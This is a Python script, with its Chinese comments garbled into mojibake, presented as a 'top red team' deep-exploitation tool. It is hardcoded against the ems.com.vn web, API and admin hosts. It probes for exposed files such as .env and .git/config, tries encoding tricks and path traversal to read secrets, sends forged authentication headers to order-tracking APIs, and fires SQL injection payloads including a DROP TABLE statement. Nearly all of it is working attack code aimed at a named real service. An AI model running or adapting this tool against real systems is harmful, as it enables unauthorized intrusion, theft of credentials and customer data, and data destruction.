#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
é¡¶çº§çº¢é˜Ÿä¸“å®¶æ·±åº¦åˆ©ç”¨å·¥å…· - åˆ©ç”¨å‘ç°çš„çªç ´å£
2025å¹´é¡¶çº§çº¢é˜Ÿå®‰å…¨ä¸“å®¶ä¸“ç”¨å·¥å…·
"""

import requests
import json
import time
import hashlib
import random
import string
from datetime import datetime
import urllib3
from urllib.parse import urljoin, urlparse, quote, unquote
import base64

# ç¦ç”¨SSLè­¦å‘Š
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class RedTeamDeepExploit:
    def __init__(self):
        self.base_url = "http://ws.ems.com.vn"
        self.api_url = "http://api.ems.com.vn"
        self.admin_url = "http://admin.ems.com.vn"
        self.session = requests.Session()
        self.session.verify = False
        self.session.timeout = 10
        self.results = {}
        self.session_id = hashlib.md5(f"deep_exploit_{int(time.time())}".encode()).hexdigest()[:8]
        
        # è®¾ç½®è¯·æ±‚å¤´
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9,vi;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'X-Requested-With': 'XMLHttpRequest'
        })
    
    def log(self, message, level="INFO"):
        """æ—¥å¿—è®°å½•"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(f"[{timestamp}] [{level}] {message}")
    
    def exploit_subdomains(self):
        """åˆ©ç”¨å‘ç°çš„å­åŸŸå"""
        self.log("ğŸ¯ åˆ©ç”¨å‘ç°çš„å­åŸŸå", "INFO")
        
        subdomains = [
            {"name": "api", "url": self.api_url},
            {"name": "admin", "url": self.admin_url}
        ]
        
        subdomain_results = {}
        
        for subdomain in subdomains:
            self.log(f"ğŸ” æ”»å‡»å­åŸŸå: {subdomain['name']}", "INFO")
            subdomain_result = {}
            
            # 1. åŸºç¡€ä¿¡æ¯æ”¶é›†
            try:
                response = self.session.get(subdomain['url'], timeout=5)
                subdomain_result['basic_info'] = {
                    'status_code': response.status_code,
                    'headers': dict(response.headers),
                    'content': response.text[:1000],
                    'size': len(response.content)
                }
                self.log(f"âœ… {subdomain['name']} åŸºç¡€ä¿¡æ¯æ”¶é›†æˆåŠŸ", "SUCCESS")
            except Exception as e:
                subdomain_result['basic_info'] = {'error': str(e)}
                self.log(f"âŒ {subdomain['name']} åŸºç¡€ä¿¡æ¯æ”¶é›†å¤±è´¥: {e}", "ERROR")
            
            # 2. ç›®å½•æšä¸¾
            directories = [
                "/", "/admin", "/api", "/app", "/mobile", "/portal", "/dashboard",
                "/console", "/panel", "/control", "/manage", "/login", "/auth",
                "/user", "/profile", "/settings", "/config", "/backup", "/logs",
                "/test", "/dev", "/staging", "/prod", "/v1", "/v2", "/v3"
            ]
            
            found_dirs = []
            for directory in directories:
                try:
                    response = self.session.get(f"{subdomain['url']}{directory}", timeout=3)
                    if response.status_code != 404:
                        found_dirs.append({
                            'directory': directory,
                            'status_code': response.status_code,
                            'content': response.text[:500]
                        })
                        self.log(f"âœ… {subdomain['name']} ç›®å½• {directory} å‘ç° (çŠ¶æ€ç : {response.status_code})", "SUCCESS")
                except:
                    pass
            
            subdomain_result['directories'] = found_dirs
            
            # 3. æ–‡ä»¶æšä¸¾
            files = [
                "/robots.txt", "/sitemap.xml", "/crossdomain.xml", "/clientaccesspolicy.xml",
                "/.well-known/security.txt", "/.well-known/assetlinks.json",
                "/api-docs", "/swagger.json", "/swagger-ui", "/openapi.json",
                "/graphql", "/graphiql", "/playground", "/.env", "/config.json",
                "/package.json", "/composer.json", "/requirements.txt", "/.git/config",
                "/.svn/entries", "/.htaccess", "/web.config", "/phpinfo.php"
            ]
            
            found_files = []
            for file in files:
                try:
                    response = self.session.get(f"{subdomain['url']}{file}", timeout=3)
                    if response.status_code != 404:
                        found_files.append({
                            'file': file,
                            'status_code': response.status_code,
                            'content': response.text[:500]
                        })
                        self.log(f"âœ… {subdomain['name']} æ–‡ä»¶ {file} å‘ç° (çŠ¶æ€ç : {response.status_code})", "SUCCESS")
                except:
                    pass
            
            subdomain_result['files'] = found_files
            
            # 4. APIç«¯ç‚¹å‘ç°
            api_endpoints = [
                "/api/v1/", "/api/v2/", "/api/v3/", "/rest/", "/graphql",
                "/v1/", "/v2/", "/v3/", "/endpoint/", "/service/", "/gateway/"
            ]
            
            found_apis = []
            for endpoint in api_endpoints:
                try:
                    response = self.session.get(f"{subdomain['url']}{endpoint}", timeout=3)
                    if response.status_code != 404:
                        found_apis.append({
                            'endpoint': endpoint,
                            'status_code': response.status_code,
                            'content': response.text[:500]
                        })
                        self.log(f"âœ… {subdomain['name']} API {endpoint} å‘ç° (çŠ¶æ€ç : {response.status_code})", "SUCCESS")
                except:
                    pass
            
            subdomain_result['apis'] = found_apis
            
            subdomain_results[subdomain['name']] = subdomain_result
            time.sleep(1)
        
        self.results['å­åŸŸååˆ©ç”¨'] = subdomain_results
        return subdomain_results
    
    def exploit_sensitive_files(self):
        """åˆ©ç”¨å‘ç°çš„æ•æ„Ÿæ–‡ä»¶"""
        self.log("ğŸ“„ åˆ©ç”¨å‘ç°çš„æ•æ„Ÿæ–‡ä»¶", "INFO")
        
        sensitive_files = [
            {"name": ".env", "url": f"{self.base_url}/.env"},
            {"name": "security.txt", "url": f"{self.base_url}/.well-known/security.txt"},
            {"name": "assetlinks.json", "url": f"{self.base_url}/.well-known/assetlinks.json"}
        ]
        
        file_results = {}
        
        for file_info in sensitive_files:
            self.log(f"ğŸ” æ”»å‡»æ•æ„Ÿæ–‡ä»¶: {file_info['name']}", "INFO")
            file_result = {}
            
            # 1. ç›´æ¥è®¿é—®
            try:
                response = self.session.get(file_info['url'], timeout=5)
                file_result['direct_access'] = {
                    'status_code': response.status_code,
                    'headers': dict(response.headers),
                    'content': response.text[:2000],
                    'size': len(response.content)
                }
                if response.status_code == 200:
                    self.log(f"ğŸ¯ {file_info['name']} ç›´æ¥è®¿é—®æˆåŠŸï¼", "SUCCESS")
                else:
                    self.log(f"âš ï¸ {file_info['name']} ç›´æ¥è®¿é—®å¤±è´¥ (çŠ¶æ€ç : {response.status_code})", "WARNING")
            except Exception as e:
                file_result['direct_access'] = {'error': str(e)}
                self.log(f"âŒ {file_info['name']} ç›´æ¥è®¿é—®é”™è¯¯: {e}", "ERROR")
            
            # 2. ç»•è¿‡æŠ€æœ¯
            bypass_techniques = [
                {"name": "URLç¼–ç ", "url": quote(file_info['url'])},
                {"name": "åŒé‡ç¼–ç ", "url": quote(quote(file_info['url']))},
                {"name": "Unicodeç¼–ç ", "url": file_info['url'].replace('.', '%2e')},
                {"name": "ç©ºå­—èŠ‚", "url": file_info['url'] + '%00'},
                {"name": "æ¢è¡Œç¬¦", "url": file_info['url'] + '%0a'},
                {"name": "åˆ¶è¡¨ç¬¦", "url": file_info['url'] + '%09'},
                {"name": "æ–œæ ç»•è¿‡", "url": file_info['url'].replace('/', '//')},
                {"name": "åæ–œæ ", "url": file_info['url'].replace('/', '\\')}
            ]
            
            bypass_results = []
            for bypass in bypass_techniques:
                try:
                    response = self.session.get(bypass['url'], timeout=3)
                    bypass_results.append({
                        'technique': bypass['name'],
                        'status_code': response.status_code,
                        'content': response.text[:500]
                    })
                    if response.status_code == 200:
                        self.log(f"ğŸ¯ {file_info['name']} {bypass['name']} ç»•è¿‡æˆåŠŸï¼", "SUCCESS")
                    else:
                        self.log(f"âŒ {file_info['name']} {bypass['name']} ç»•è¿‡å¤±è´¥ (çŠ¶æ€ç : {response.status_code})", "WARNING")
                except Exception as e:
                    bypass_results.append({
                        'technique': bypass['name'],
                        'error': str(e)
                    })
                    self.log(f"âŒ {file_info['name']} {bypass['name']} ç»•è¿‡é”™è¯¯: {e}", "ERROR")
            
            file_result['bypass_techniques'] = bypass_results
            
            # 3. ç›®å½•éå†
            if file_info['name'] == '.env':
                traversal_paths = [
                    "../.env", "../../.env", "../../../.env", "../../../../.env",
                    "..\\..\\.env", "..\\..\\..\\.env", "..\\..\\..\\..\\.env",
                    "%2e%2e%2f.env", "%2e%2e%2f%2e%2e%2f.env", "%2e%2e%2f%2e%2e%2f%2e%2e%2f.env"
                ]
                
                traversal_results = []
                for path in traversal_paths:
                    try:
                        response = self.session.get(f"{self.base_url}/{path}", timeout=3)
                        traversal_results.append({
                            'path': path,
                            'status_code': response.status_code,
                            'content': response.text[:500]
                        })
                        if response.status_code == 200:
                            self.log(f"ğŸ¯ {file_info['name']} ç›®å½•éå†æˆåŠŸ: {path}", "SUCCESS")
                        else:
                            self.log(f"âŒ {file_info['name']} ç›®å½•éå†å¤±è´¥: {path} (çŠ¶æ€ç : {response.status_code})", "WARNING")
                    except Exception as e:
                        traversal_results.append({
                            'path': path,
                            'error': str(e)
                        })
                        self.log(f"âŒ {file_info['name']} ç›®å½•éå†é”™è¯¯: {path} - {e}", "ERROR")
                
                file_result['traversal_paths'] = traversal_results
            
            file_results[file_info['name']] = file_result
            time.sleep(1)
        
        self.results['æ•æ„Ÿæ–‡ä»¶åˆ©ç”¨'] = file_results
        return file_results
    
    def exploit_authentication_bypass(self):
        """åˆ©ç”¨è®¤è¯ç»•è¿‡"""
        self.log("ğŸ”“ åˆ©ç”¨è®¤è¯ç»•è¿‡", "INFO")
        
        # ä½¿ç”¨ä¹‹å‰å‘ç°çš„æˆåŠŸç»•è¿‡æ–¹æ³•
        bypass_headers = [
            {"name": "ç©ºè®¤è¯å¤´", "headers": {"Authorization": ""}},
            {"name": "æ— æ•ˆè®¤è¯å¤´", "headers": {"Authorization": "Bearer invalid"}},
            {"name": "åŸºæœ¬è®¤è¯", "headers": {"Authorization": "Basic dGVzdDp0ZXN0"}},
            {"name": "APIå¯†é’¥", "headers": {"X-API-Key": "test"}},
            {"name": "è‡ªå®šä¹‰å¤´", "headers": {"X-Auth-Token": "test"}},
            {"name": "ç”¨æˆ·ä»£ç†", "headers": {"User-Agent": "EMS-Portal-Android/2.3.0"}},
            {"name": "å¼•ç”¨å¤´", "headers": {"Referer": "https://ems.com.vn"}},
            {"name": "æ¥æºå¤´", "headers": {"Origin": "https://ems.com.vn"}}
        ]
        
        bypass_results = {}
        
        # æµ‹è¯•æ‰€æœ‰APIç«¯ç‚¹
        api_endpoints = [
            "/api/v1/orders/list",
            "/api/v1/orders/create-v2",
            "/api/v1/orders/tracking/123456",
            "/api/v1/orders/quotes",
            "/api/v1/config/service",
            "/api/v1/metadata/vas",
            "/api/v1/address/province-and-district"
        ]
        
        for endpoint in api_endpoints:
            self.log(f"ğŸ” æµ‹è¯•APIç«¯ç‚¹: {endpoint}", "INFO")
            endpoint_results = {}
            
            for bypass in bypass_headers:
                try:
                    response = self.session.get(f"{self.base_url}{endpoint}", headers=bypass['headers'], timeout=5)
                    endpoint_results[bypass['name']] = {
                        'status_code': response.status_code,
                        'content': response.text[:1000],
                        'headers': dict(response.headers)
                    }
                    
                    if response.status_code == 200 and "error" not in response.text.lower():
                        self.log(f"ğŸ¯ {endpoint} {bypass['name']} ç»•è¿‡æˆåŠŸï¼", "SUCCESS")
                    else:
                        self.log(f"âŒ {endpoint} {bypass['name']} ç»•è¿‡å¤±è´¥ (çŠ¶æ€ç : {response.status_code})", "WARNING")
                except Exception as e:
                    endpoint_results[bypass['name']] = {'error': str(e)}
                    self.log(f"âŒ {endpoint} {bypass['name']} ç»•è¿‡é”™è¯¯: {e}", "ERROR")
            
            bypass_results[endpoint] = endpoint_results
            time.sleep(0.5)
        
        self.results['è®¤è¯ç»•è¿‡åˆ©ç”¨'] = bypass_results
        return bypass_results
    
    def exploit_sql_injection(self):
        """åˆ©ç”¨SQLæ³¨å…¥"""
        self.log("ğŸ’‰ åˆ©ç”¨SQLæ³¨å…¥", "INFO")
        
        sql_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT 1,2,3--",
            "'; DROP TABLE users--",
            "' OR '1'='1' AND '1'='1",
            "1' OR '1'='1",
            "admin'--",
            "' OR 1=1#",
            "' OR 'x'='x",
            "1' OR 1=1 LIMIT 1--"
        ]
        
        sql_results = {}
        
        # æµ‹è¯•æ‰€æœ‰APIç«¯ç‚¹
        api_endpoints = [
            "/api/v1/orders/list",
            "/api/v1/orders/tracking/123456",
            "/api/v1/tickets/list",
            "/api/v1/inventory/list"
        ]
        
        for endpoint in api_endpoints:
            self.log(f"ğŸ’‰ æµ‹è¯•SQLæ³¨å…¥: {endpoint}", "INFO")
            endpoint_results = {}
            
            for i, payload in enumerate(sql_payloads):
                try:
                    # GETè¯·æ±‚
                    response = self.session.get(f"{self.base_url}{endpoint}?id={payload}", timeout=5)
                    endpoint_results[f"GET_{i+1}"] = {
                        'payload': payload,
                        'status_code': response.status_code,
                        'content': response.text[:1000]
                    }
                    
                    if "error" in response.text.lower() or "exception" in response.text.lower():
                        self.log(f"ğŸ¯ {endpoint} SQLæ³¨å…¥æˆåŠŸ: {payload}", "SUCCESS")
                    else:
                        self.log(f"âŒ {endpoint} SQLæ³¨å…¥å¤±è´¥: {payload}", "WARNING")
                    
                    # POSTè¯·æ±‚
                    post_data = {"id": payload, "search": payload}
                    response = self.session.post(f"{self.base_url}{endpoint}", json=post_data, timeout=5)
                    endpoint_results[f"POST_{i+1}"] = {
                        'payload': payload,
                        'status_code': response.status_code,
                        'content': response.text[:1000]
                    }
                    
                    if "error" in response.text.lower() or "exception" in response.text.lower():
                        self.log(f"ğŸ¯ {endpoint} POST SQLæ³¨å…¥æˆåŠŸ: {payload}", "SUCCESS")
                    else:
                        self.log(f"âŒ {endpoint} POST SQLæ³¨å…¥å¤±è´¥: {payload}", "WARNING")
                    
                    time.sleep(0.3)
                except Exception as e:
                    endpoint_results[f"ERROR_{i+1}"] = {'error': str(e)}
                    self.log(f"âŒ {endpoint} SQLæ³¨å…¥é”™è¯¯: {payload} - {e}", "ERROR")
            
            sql_results[endpoint] = endpoint_results
            time.sleep(1)
        
        self.results['SQLæ³¨å…¥åˆ©ç”¨'] = sql_results
        return sql_results
    
    def generate_exploit_report(self):
        """ç”Ÿæˆåˆ©ç”¨æŠ¥å‘Š"""
        self.log("ğŸ“‹ ç”Ÿæˆåˆ©ç”¨æŠ¥å‘Š", "INFO")
        
        report = {
            "session_id": self.session_id,
            "timestamp": datetime.now().isoformat(),
            "base_url": self.base_url,
            "results": self.results,
            "summary": {
                "total_exploits": len(self.results),
                "successful_exploits": len([r for r in self.results.get('è®¤è¯ç»•è¿‡åˆ©ç”¨', {}).values() if isinstance(r, dict) and any('status_code' in sub_r and sub_r['status_code'] == 200 for sub_r in r.values() if isinstance(sub_r, dict))]),
                "vulnerabilities_found": len([r for r in self.results.get('SQLæ³¨å…¥åˆ©ç”¨', {}).values() if isinstance(r, dict) and any('content' in sub_r and 'error' in sub_r['content'].lower() for sub_r in r.values() if isinstance(sub_r, dict))]),
                "risk_level": "CRITICAL" if len([r for r in self.results.get('è®¤è¯ç»•è¿‡åˆ©ç”¨', {}).values() if isinstance(r, dict) and any('status_code' in sub_r and sub_r['status_code'] == 200 for sub_r in r.values() if isinstance(sub_r, dict))]) > 0 else "HIGH"
            }
        }
        
        # ä¿å­˜æŠ¥å‘Š
        report_file = f"/tmp/redteam_exploit_report_{self.session_id}.json"
        with open(report_file, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)
        
        self.log(f"ğŸ“‹ æŠ¥å‘Šå·²ä¿å­˜: {report_file}", "SUCCESS")
        return report
    
    def run_deep_exploit(self):
        """è¿è¡Œæ·±åº¦åˆ©ç”¨æ”»å‡»"""
        self.log("ğŸš€ å¯åŠ¨é¡¶çº§çº¢é˜Ÿä¸“å®¶æ·±åº¦åˆ©ç”¨æ”»å‡»", "INFO")
        self.log("=" * 60, "INFO")
        
        # 1. åˆ©ç”¨å­åŸŸå
        self.exploit_subdomains()
        
        # 2. åˆ©ç”¨æ•æ„Ÿæ–‡ä»¶
        self.exploit_sensitive_files()
        
        # 3. åˆ©ç”¨è®¤è¯ç»•è¿‡
        self.exploit_authentication_bypass()
        
        # 4. åˆ©ç”¨SQLæ³¨å…¥
        self.exploit_sql_injection()
        
        # 5. ç”ŸæˆæŠ¥å‘Š
        report = self.generate_exploit_report()
        
        self.log("ğŸ¯ æ·±åº¦åˆ©ç”¨æ”»å‡»å®Œæˆï¼", "SUCCESS")
        self.log(f"é£é™©ç­‰çº§: {report['summary']['risk_level']}", "WARNING")
        self.log(f"æˆåŠŸåˆ©ç”¨: {report['summary']['successful_exploits']}", "SUCCESS")
        self.log(f"å‘ç°æ¼æ´: {report['summary']['vulnerabilities_found']}", "WARNING")
        
        return report

def main():
    exploiter = RedTeamDeepExploit()
    exploiter.run_deep_exploit()

if __name__ == "__main__":
    main()